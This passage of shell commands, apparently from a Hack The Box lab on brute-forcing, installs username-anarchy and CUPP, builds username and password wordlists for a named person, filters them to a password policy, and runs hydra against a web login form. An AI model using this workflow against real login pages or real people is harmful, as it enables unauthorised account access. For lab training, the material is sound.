...
```shell-session
frank-106@htb[/htb]$ ./username-anarchy -l
...
```shell-session
frank-106@htb[/htb]$ sudo apt install ruby -y
frank-106@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git
frank-106@htb[/htb]$ cd username-anarchy
```
...
```shell-session
frank-106@htb[/htb]$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
```
...
```shell-session
frank-106@htb[/htb]$ sudo apt install cupp -y
```
...
```shell-session
frank-106@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```
...
```shell-session
frank-106@htb[/htb]$ hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
